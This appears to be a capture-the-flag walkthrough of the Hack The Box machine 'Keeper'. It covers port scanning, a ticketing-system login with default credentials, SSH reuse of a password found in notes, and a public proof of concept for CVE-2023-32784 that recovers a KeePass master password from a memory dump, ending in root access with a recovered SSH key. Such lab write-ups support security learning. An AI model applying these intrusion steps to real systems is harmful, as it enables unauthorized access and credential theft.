# easy - Keeper

## User flag

Ok, from the beginning this machines reveals a host:
```bash
~z➤ curl -s keeper.htb | xurls
http://tickets.keeper.htb/rt/
```

We can realize it is a Nginx web server, only SSH and HTTP ports are open:
```bash
.../htb/p8/keeper➤ sudo nmap -n -Pn -sV -O -T4 keeper.htb
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Ok, so we get an ugly web page at http://tickets.keeper.htb/rt/
```bash
~z➤ curl -s tickets.keeper.htb/rt | xurls
http://bestpractical.com
http://www.bestpractical.com?rt=4.4.4+dfsg-2ubuntu1
http://www.gnu.org/licenses/gpl-2.0.html
mailto:sales@bestpractical.com

~z➤ curl -s tickets.keeper.htb | ag href
<link rel="stylesheet" href="/rt/NoAuth/css/rudder/squished-1d23a49d22745117f5e143fd93989aaf.css" type="text/css" media="all" />
<link rel="shortcut icon" href="/rt/static/images/favicon.png" type="image/png" />
<link rel="stylesheet" href="/rt/static/css/rudder/msie.css" type="text/css" media="all" />
<a href="http://bestpractical.com"><img
    <span class="hide"><a href="#skipnav">Skip Menu</a> | </span>
  <p id="bpscredits"><span>&#187;&#124;&#171; RT 4.4.4+dfsg-2ubuntu1 (Debian) Copyright 1996-2019 <a href="http://www.bestpractical.com?rt=4.4.4+dfsg-2ubuntu1">Best Practical Solutions, LLC</a>.
  <p id="legal">Distributed under <a href="http://www.gnu.org/licenses/gpl-2.0.html">version 2 of the GNU GPL</a>.<br />To inquire about support, training, custom development or licensing, please contact <a href="mailto:sales@bestpractical.com">sales@bestpractical.com</a>.<br /></p>
```

Ok, they are using a Ticketing system called "bestpractical", version: `4.4.4+dfsg-2ubuntu1`
{{< limg "/i/2023-08-18_11-21.png" "Ticketing web page" >}}

We got in with default credentials, thanks to https://docs.bestpractical.com/rt/4.4.4/README.html :
{{< limg "/i/2023-08-18_11-36.png" "Logged in" >}}

Maybe this is something, while Googling, I found that 4.4.4 has a vulnerability and its CVE:
> Best Practical Request Tracker (RT) 4.2 before 4.2.17, 4.4 before 4.4.5, and 5.0 before 5.0.2 allows sensitive information disclosure via a timing attack against lib/RT/REST2/Middleware/Auth.pm. 

Found these emails while navigating the web page:
- lnorgaard@keeper.htb
- root@localhost

While navigating the webpage, I've found a message (under User Information notes) stating that the new password has been set to "*******". That password is what lnorgaard uses for SSH

We have SSH Access now:
```bash
.../htb/p8/keeper➤ ssh lnorgaard@keeper.htb
lnorgaard@keeper.htb's password:
...
lnorgaard@keeper:~$ id
uid=1000(lnorgaard) gid=1000(lnorgaard) groups=1000(lnorgaard)
```

## Root flag

Ok, there was this ZIP file in the user home dir, I downloaded and got this:
```bash
~z➤ tree
.
├── KeePassDumpFull.dmp
├── passcodes.kdbx
└── RT30000.zip
```

So that name "keepass" says that file is somehow related to KeePass tool, a password manager tool https://keepass.info and there is this CVE-2023-32784 report, where clear-text can be obtained from a memory dump of KeePass. A brandly new created git repo for this :D https://github.com/vdohney/keepass-password-dumper

So let's clone that PoC repo and try to exploit it:
```bash
.../keeper/src/keepass-password-dumper➤ dotnet run KeePassDumpFull.dmp
...
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
...
Found: ●M

Password candidates (character positions):
Unknown characters are displayed as "●"
1.:     ●
11.:    d,
...
17.:    e,
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
```

Ok, we have now the master passowrd, if we read the documentation of the CVE it says that the password doesn't appear completely, the initial 1 or 2 characters might be missing, so by googling we can infer what the actual password is. Let's try to use KeePass and see the content:
{{< limg "/i/2023-08-18_12-21.png" "KeePass opened" >}}

By opening the item "keeper.htb (Ticketing.... root" I saw this SSH key in the "Notes" section:
```bash
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
...
...
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

So we are closer now, that must be root's ssh key, let's reformat it to use it from Arch Linux:
```bash
z➤ puttygen creds.txt -O private-openssh -o private

z➤ ssh -i private root@keeper.htb
root@keeper:~# ls
root.txt  RT30000.zip  SQL
root@keeper:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## TODOs
- Review in depth how KeePas works and its CVE-2023-32784
